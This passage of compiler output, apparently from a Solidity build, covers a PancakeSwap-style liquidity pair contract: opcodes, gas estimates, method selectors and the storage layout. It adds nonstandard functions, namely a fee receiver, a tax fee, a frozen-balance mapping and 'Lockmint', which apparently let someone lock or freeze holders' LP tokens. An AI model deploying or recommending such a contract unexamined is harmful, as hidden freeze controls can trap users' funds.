DUP2 AND PUSH1 0x24 DUP4 ADD MSTORE PUSH1 0x44 DUP1 DUP4 ADD DUP7 SWAP1 MSTORE DUP5 MLOAD DUP1 DUP5 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0x64 SWAP1 SWAP3 ADD DUP5 MSTORE SWAP2 DUP2 ADD DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB AND PUSH4 0xA9059CBB PUSH1 0xE0 SHL OR DUP2 MSTORE SWAP3 MLOAD DUP2 MLOAD PUSH1 0x0 SWAP5 PUSH1 0x60 SWAP5 DUP10 AND SWAP4 SWAP3 SWAP2 DUP3 SWAP2 SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x1D16 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x1F NOT SWAP1 SWAP3 ADD SWAP2 PUSH1 0x20 SWAP2 DUP3 ADD SWAP2 ADD PUSH2 0x1CF7 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x1D78 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x1D7D JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP SWAP2 POP SWAP2 POP DUP2 DUP1 ISZERO PUSH2 0x1DAB JUMPI POP DUP1 MLOAD ISZERO DUP1 PUSH2 0x1DAB JUMPI POP DUP1 DUP1 PUSH1 0x20 ADD SWAP1 MLOAD PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1DA8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD JUMPDEST PUSH2 0x1DFC JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x18 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A205452414E534645525F4641494C45440000000000000000 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO DUP1 PUSH2 0x1E1E JUMPI POP POP DUP1 DUP3 MUL DUP3 DUP3 DUP3 DUP2 PUSH2 0x1E1B JUMPI INVALID JUMPDEST DIV EQ JUMPDEST PUSH2 0xC75 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x14 PUSH1 0x24 DUP3 ADD MSTORE PUSH20 0x64732D6D6174682D6D756C2D6F766572666C6F77 PUSH1 0x60 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST DUP1 DUP3 SUB DUP3 DUP2 GT ISZERO PUSH2 0xC75 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x15 PUSH1 0x24 DUP3 ADD MSTORE PUSH21 0x64732D6D6174682D7375622D756E646572666C6F77 PUSH1 0x58 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP5 GT DUP1 ISZERO SWAP1 PUSH2 0x1ED4 JUMPI POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP4 GT ISZERO JUMPDEST PUSH2 0x1F19 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x11 PUSH1 0x24 DUP3 ADD MSTORE PUSH17 0x50616E63616B653A204F564552464C4F57 PUSH1 0x78 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0xB SLOAD PUSH4 0xFFFFFFFF TIMESTAMP DUP2 AND SWAP2 PUSH1 0x1 PUSH1 0xE0 SHL SWAP1 DIV DUP2 AND DUP3 SUB SWAP1 DUP2 AND ISZERO DUP1 ISZERO SWAP1 PUSH2 0x1F49 JUMPI POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP5 AND ISZERO ISZERO JUMPDEST DUP1 ISZERO PUSH2 0x1F5D JUMPI POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP4 AND ISZERO ISZERO JUMPDEST ISZERO PUSH2 0x1FCE JUMPI DUP1 PUSH4 0xFFFFFFFF AND PUSH2 0x1F8B DUP6 PUSH2 0x1F76 DUP7 PUSH2 0x2556 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB AND SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x2568 AND JUMP JUMPDEST PUSH1 0xC DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB SWAP3 SWAP1 SWAP3 AND SWAP3 SWAP1 SWAP3 MUL ADD SWAP1 SSTORE PUSH4 0xFFFFFFFF DUP2 AND PUSH2 0x1FB6 DUP5 PUSH2 0x1F76 DUP8 PUSH2 0x2556 JUMP JUMPDEST PUSH1 0xD DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB SWAP3 SWAP1 SWAP3 AND SWAP3 SWAP1 SWAP3 MUL ADD SWAP1 SSTORE JUMPDEST PUSH1 0xB DUP1 SLOAD PUSH14 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP9 DUP2 AND SWAP2 SWAP1 SWAP2 OR PUSH14 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFF PUSH1 0x70 SHL NOT AND PUSH1 0x1 PUSH1 0x70 SHL DUP9 DUP4 AND DUP2 MUL SWAP2 SWAP1 SWAP2 OR PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB AND PUSH1 0x1 PUSH1 0xE0 SHL PUSH4 0xFFFFFFFF DUP8 AND MUL OR SWAP3 DUP4 SWAP1 SSTORE PUSH1 0x40 DUP1 MLOAD DUP5 DUP5 AND DUP2 MSTORE SWAP2 SWAP1 SWAP4 DIV SWAP1 SWAP2 AND PUSH1 0x20 DUP3 ADD MSTORE DUP2 MLOAD PUSH32 0x1C411E9A96E071241C2F21F7726B17AE89E3CAB4C78BE50E062B03A9FFFBBAD1 SWAP3 SWAP2 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG1 POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 DUP8 AND DUP1 DUP5 MSTORE SWAP5 DUP3 MSTORE SWAP2 DUP3 SWAP1 KECCAK256 DUP6 SWAP1 SSTORE DUP2 MLOAD DUP6 DUP2 MSTORE SWAP2 MLOAD PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x2104 SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 DUP1 DUP3 KECCAK256 SWAP4 SWAP1 SWAP4 SSTORE SWAP1 DUP5 AND DUP2 MSTORE KECCAK256 SLOAD PUSH2 0x2139 SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x258D AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP2 DUP3 SWAP1 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP1 MLOAD DUP6 DUP2 MSTORE SWAP1 MLOAD SWAP2 SWAP4 SWAP3 DUP8 AND SWAP3 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x264D DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP3 SWAP2 DUP3 SWAP1 SUB ADD SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x7 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x17E7E58 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x21D4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x21E8 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x21FE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0xE SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND ISZERO DUP1 ISZERO SWAP5 POP SWAP2 SWAP3 POP SWAP1 PUSH2 0x22E2 JUMPI DUP1 ISZERO PUSH2 0x22DD JUMPI PUSH1 0x0 PUSH2 0x2241 PUSH2 0xFC4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP9 DUP2 AND SWAP1 DUP9 AND PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x224E DUP4 PUSH2 0x22F6 JUMP JUMPDEST SWAP1 POP DUP1 DUP3 GT ISZERO PUSH2 0x22DA JUMPI PUSH1 0x0 PUSH2 0x2281 PUSH1 0x8 PUSH2 0xB47 PUSH2 0x2272 DUP7 DUP7 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x22B6 PUSH2 0x2299 DUP5 PUSH1 0x8 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH2 0x22AA DUP7 PUSH1 0x11 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x258D AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP2 DUP4 DUP2 PUSH2 0x22C3 JUMPI INVALID JUMPDEST DIV SWAP1 POP DUP1 ISZERO PUSH2 0x22D6 JUMPI PUSH2 0x22D6 DUP8 DUP3 PUSH2 0x2348 JUMP JUMPDEST POP POP POP JUMPDEST POP POP JUMPDEST PUSH2 0x22EE JUMP JUMPDEST DUP1 ISZERO PUSH2 0x22EE JUMPI PUSH1 0x0 PUSH1 0xE SSTORE JUMPDEST POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x3 DUP3 GT ISZERO PUSH2 0x2339 JUMPI POP DUP1 PUSH1 0x1 PUSH1 0x2 DUP3 DIV ADD JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0x2333 JUMPI DUP1 SWAP2 POP PUSH1 0x2 DUP2 DUP3 DUP6 DUP2 PUSH2 0x2322 JUMPI INVALID JUMPDEST DIV ADD DUP2 PUSH2 0x232B JUMPI INVALID JUMPDEST DIV SWAP1 POP PUSH2 0x230B JUMP JUMPDEST POP PUSH2 0x2343 JUMP JUMPDEST DUP2 ISZERO PUSH2 0x2343 JUMPI POP PUSH1 0x1 JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH2 0x235B SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x258D AND JUMP JUMPDEST PUSH1 0x0 SWAP1 DUP2 SSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x2386 SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x258D AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP4 MLOAD DUP6 DUP2 MSTORE SWAP4 MLOAD SWAP3 SWAP4 SWAP2 SWAP3 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x264D DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 DUP4 LT PUSH2 0x23DB JUMPI DUP2 PUSH2 0x23DD JUMP JUMPDEST DUP3 JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x240D SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 DUP2 KECCAK256 SWAP2 SWAP1 SWAP2 SSTORE SLOAD PUSH2 0x243A SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST PUSH1 0x0 SWAP1 DUP2 SSTORE PUSH1 0x40 DUP1 MLOAD DUP4 DUP2 MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND SWAP2 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x264D DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH2 0x24CD JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1F PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x42455032303A206D696E7420746F20746865207A65726F206164647265737300 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 SLOAD PUSH2 0x24E0 SWAP1 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x258D AND JUMP JUMPDEST PUSH1 0x0 SWAP1 DUP2 SSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND DUP2 MSTORE PUSH1 0x3 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x250B SWAP1 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x258D AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x3 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP4 MLOAD DUP7 DUP2 MSTORE SWAP4 MLOAD SWAP3 SWAP4 SWAP2 SWAP3 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x264D DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP PUSH1 0x1 SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND PUSH1 0x1 PUSH1 0x70 SHL MUL SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP3 AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB DUP5 AND DUP2 PUSH2 0x2585 JUMPI INVALID JUMPDEST DIV SWAP4 SWAP3 POP POP POP JUMP JUMPDEST DUP1 DUP3 ADD DUP3 DUP2 LT ISZERO PUSH2 0xC75 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x14 PUSH1 0x24 DUP3 ADD MSTORE PUSH20 0x64732D6D6174682D6164642D6F766572666C6F77 PUSH1 0x60 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT INVALID POP PUSH2 0x6E63 PUSH2 0x6B65 GASPRICE KECCAK256 0x49 0x4E MSTORE8 SSTORE CHAINID CHAINID 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x49 0x4E POP SSTORE SLOAD 0x5F COINBASE 0x4D 0x4F SSTORE 0x4E SLOAD SSTORE PUSH15 0x697377617056323A20494E53554646 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x4C 0x49 MLOAD SSTORE 0x49 DIFFICULTY 0x49 SLOAD MSIZE 0x5F 0x4D 0x49 0x4E SLOAD GASLIMIT DIFFICULTY POP PUSH2 0x6E63 PUSH2 0x6B65 GASPRICE KECCAK256 0x49 0x4E MSTORE8 SSTORE CHAINID CHAINID 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x4C 0x49 MLOAD SSTORE 0x49 DIFFICULTY 0x49 SLOAD MSIZE 0x5F TIMESTAMP SSTORE MSTORE 0x4E GASLIMIT DIFFICULTY 0xDD CALLCODE MSTORE 0xAD SHL 0xE2 0xC8 SWAP12 PUSH10 0xC2B068FC378DAA952BA7 CALL PUSH4 0xC4A11628 CREATE2 GAS 0x4D CREATE2 0x23 0xB3 0xEF POP PUSH2 0x6E63 PUSH2 0x6B65 GASPRICE KECCAK256 0x49 0x4E MSTORE8 SSTORE CHAINID CHAINID 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x4F SSTORE SLOAD POP SSTORE SLOAD 0x5F COINBASE 0x4D 0x4F SSTORE 0x4E SLOAD POP PUSH2 0x6E63 PUSH2 0x6B65 GASPRICE KECCAK256 0x49 0x4E MSTORE8 SSTORE CHAINID CHAINID 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x4C 0x49 MLOAD SSTORE 0x49 DIFFICULTY 0x49 SLOAD MSIZE 0x5F 0x4D 0x49 0x4E SLOAD GASLIMIT DIFFICULTY LOG2 PUSH6 0x627A7A723158 KECCAK256 0xCD 0x5F PUSH2 0x2284 0xCF RETURNDATACOPY PUSH7 0x3022F426C74F2B 0xB2 DUP14 CODESIZE PUSH6 0x9C6E56172357 DUP2 DUP11 SSTORE 0xC1 0xBF DUP7 0xF8 PUSH5 0x736F6C6343 STOP SDIV LT STOP ORIGIN GASLIMIT 0x49 POP CALLDATACOPY BALANCE ORIGIN DIFFICULTY PUSH16 0x6D61696E28737472696E67206E616D65 0x2C PUSH20 0x7472696E672076657273696F6E2C75696E743235 CALLDATASIZE KECCAK256 PUSH4 0x6861696E 0x49 PUSH5 0x2C61646472 PUSH6 0x737320766572 PUSH10 0x6679696E67436F6E7472 PUSH2 0x6374 0x29 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "1992400",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"DOMAIN_SEPARATOR()": "1110",
						"FeeResiver()": "1082",
						"Lockmint(address)": "infinite",
						"MINIMUM_LIQUIDITY()": "309",
						"PERMIT_TYPEHASH()": "266",
						"_frozenBalance(address)": "1169",
						"allowance(address,address)": "1283",
						"approve(address,uint256)": "22366",
						"balanceOf(address)": "1170",
						"burn(address)": "infinite",
						"decimals()": "297",
						"factory()": "1104",
						"getReserves()": "1240",
						"initialize(address,address,uint256)": "62887",
						"kLast()": "1066",
						"mint(address)": "infinite",
						"name()": "infinite",
						"nonces(address)": "1214",
						"permit(address,address,uint256,uint256,uint8,bytes32,bytes32)": "infinite",
						"price0CumulativeLast()": "1065",
						"price1CumulativeLast()": "1087",
						"skim(address)": "infinite",
						"swap(uint256,uint256,address,bytes)": "infinite",
						"symbol()": "infinite",
						"sync()": "infinite",
						"taxfee()": "1086",
						"token0()": "1105",
						"token1()": "1126",
						"totalSupply()": "1110",
						"transfer(address,uint256)": "infinite",
						"transferFrom(address,address,uint256)": "infinite"
					},
					"internal": {
						"_mintFee(uint112,uint112)": "infinite",
						"_safeTransfer(address,address,uint256)": "infinite",
						"_update(uint256,uint256,uint112,uint112)": "infinite"
					}
				},
				"methodIdentifiers": {
					"DOMAIN_SEPARATOR()": "3644e515",
					"FeeResiver()": "900820d8",
					"Lockmint(address)": "dcbbb373",
					"MINIMUM_LIQUIDITY()": "ba9a7a56",
					"PERMIT_TYPEHASH()": "30adf81f",
					"_frozenBalance(address)": "47d5d856",
					"allowance(address,address)": "dd62ed3e",
					"approve(address,uint256)": "095ea7b3",
					"balanceOf(address)": "70a08231",
					"burn(address)": "89afcb44",
					"decimals()": "313ce567",
					"factory()": "c45a0155",
					"getReserves()": "0902f1ac",
					"initialize(address,address,uint256)": "1794bb3c",
					"kLast()": "7464fc3d",
					"mint(address)": "6a627842",
					"name()": "06fdde03",
					"nonces(address)": "7ecebe00",
					"permit(address,address,uint256,uint256,uint8,bytes32,bytes32)": "d505accf",
					"price0CumulativeLast()": "5909c0d5",
					"price1CumulativeLast()": "5a3d5493",
					"skim(address)": "bc25cf77",
					"swap(uint256,uint256,address,bytes)": "022c0d9f",
					"symbol()": "95d89b41",
					"sync()": "fff6cae9",
					"taxfee()": "f317739c",
					"token0()": "0dfe1681",
					"token1()": "d21220a7",
					"totalSupply()": "18160ddd",
					"transfer(address,uint256)": "a9059cbb",
					"transferFrom(address,address,uint256)": "23b872dd"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 19,
						"contract": "src/Pair.sol:Pair",
						"label": "totalSupply",
						"offset": 0,
						"slot": "0",
						"type": "t_uint256"
					},
					{
						"astId": 23,
						"contract": "src/Pair.sol:Pair",
						"label": "balanceOf",
						"offset": 0,
						"slot": "1",
						"type": "t_mapping(t_address,t_uint256)"
					},
					{
						"astId": 29,
						"contract": "src/Pair.sol:Pair",
						"label": "allowance",
						"offset": 0,
						"slot": "2",
						"type": "t_mapping(t_address,t_mapping(t_address,t_uint256))"
					},
					{
						"astId": 33,
						"contract": "src/Pair.sol:Pair",
						"label": "_frozenBalance",
						"offset": 0,
						"slot": "3",
						"type": "t_mapping(t_address,t_uint256)"
					},
					{
						"astId": 35,
						"contract": "src/Pair.sol:Pair",
						"label": "DOMAIN_SEPARATOR",
						"offset": 0,
						"slot": "4",
						"type": "t_bytes32"
					},
					{
						"astId": 42,
						"contract": "src/Pair.sol:Pair",
						"label": "nonces",
						"offset": 0,
						"slot": "5",
						"type": "t_mapping(t_address,t_uint256)"
					},
					{
						"astId": 950,
						"contract": "src/Pair.sol:Pair",
						"label": "FeeResiver",
						"offset": 0,
						"slot": "6",
						"type": "t_address"
					},
					{
						"astId": 966,
						"contract": "src/Pair.sol:Pair",
						"label": "factory",
						"offset": 0,
						"slot": "7",
						"type": "t_address"
					},
					{
						"astId": 968,
						"contract": "src/Pair.sol:Pair",
						"label": "token0",
						"offset": 0,
						"slot": "8",
						"type": "t_address"
					},
					{
						"astId": 970,
						"contract": "src/Pair.sol:Pair",
						"label": "token1",
						"offset": 0,
						"slot": "9",
						"type": "t_address"
					},
					{
						"astId": 972,
						"contract": "src/Pair.sol:Pair",
						"label": "taxfee",
						"offset": 0,
						"slot": "10",
						"type": "t_uint256"
					},
					{
						"astId": 974,
						"contract": "src/Pair.sol:Pair",
						"label": "reserve0",
						"offset": 0,
						"slot": "11",
						"type": "t_uint112"
					},
					{
						"astId": 976,
						"contract": "src/Pair.sol:Pair",
						"label": "reserve1",
						"offset": 14,
						"slot": "11",
						"type": "t_uint112"
					},
					{
						"astId": 978,
						"contract": "src/Pair.sol:Pair",
						"label": "blockTimestampLast",
						"offset": 28,
						"slot": "11",
						"type": "t_uint32"
					},
					{
						"astId": 980,
						"contract": "src/Pair.sol:Pair",
						"label": "price0CumulativeLast",
						"offset": 0,
						"slot": "12",
						"type": "t_uint256"
					},
					{
						"astId": 982,
						"contract": "src/Pair.sol:Pair",
						"label": "price1CumulativeLast",
						"offset": 0,
						"slot": "13",
						"type": "t_uint256"
					},
					{
						"astId": 984,
						"contract": "src/Pair.sol:Pair",
						"label": "kLast",
						"offset": 0,
						"slot": "14",
						"type": "t_uint256"
					},
					{
						"astId": 987,
						"contract": "src/Pair.sol:Pair",
						"label": "unlocked",
						"offset": 0,
						"slot": "15",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_bytes32": {
						"encoding": "inplace",
						"label": "bytes32",
						"numberOfBytes": "32"
					},
					"t_mapping(t_address,t_mapping(t_address,t_uint256))": {
						"encoding": "mapping",
						"key": "t_address",
						"label": "mapping(address => mapping(address => uint256))",
						"numberOfBytes": "32",
						"value": "t_mapping(t_address,t_uint256)"
					},
					"t_mapping(t_address,t_uint256)": {
						"encoding": "mapping",
						"key": "t_address",
						"label": "mapping(address => uint256)",
						"numberOfBytes": "32",
						"value": "t_uint256"
					},
					"t_uint112": {
						"encoding": "inplace",
						"label": "uint112",
						"numberOfBytes": "14"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					},
					"t_uint32": {
						"encoding": "inplace",
						"label": "uint32",
						"numberOfBytes": "4"
					}
				}
			},
			"userdoc": {
				"methods": {}
			}
		}
	}
}